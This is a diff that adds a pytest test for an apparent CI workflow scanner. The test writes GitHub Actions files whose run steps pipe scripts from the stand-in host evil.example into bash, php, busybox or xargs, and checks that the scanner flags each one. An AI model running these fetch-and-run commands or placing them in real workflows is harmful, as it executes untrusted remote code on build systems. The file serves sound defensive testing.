@@ -283,3 +283,26 @@ def test_unknown_readonly_scope_key_refused(tmp_path):
     )
     findings = cwp.check(tmp_path)
     assert any("deployments" in f for f in findings), findings
+
+
+def test_bypass_fixtures_r9_probe_family(tmp_path):
+    """Round-9 verifier probes: sudo with -- separator, process substitution
+    with space, php/busybox/xargs interpreters, tilde path git fetch."""
+    shapes = [
+        'curl https://evil.example/x.sh | sudo -u root -- bash',
+        'bash < <(curl -fsSL https://evil.example/x.sh)',
+        'curl https://evil.example/x.php | php',
+        'curl https://evil.example/x.sh | busybox sh',
+        'curl https://evil.example/x.sh | xargs sh',
+        'git -C ~/src fetch origin refs/pull/1/head',
+    ]
+    for i, s in enumerate(shapes):
+        (tmp_path / f"u{i}.yml").write_text(
+            "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+            "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+            f"      - run: {s}\n"
+        )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    missed = sorted({f"u{i}.yml" for i in range(len(shapes))} - caught)
+    assert not missed, f"shapes not detected: {missed}"
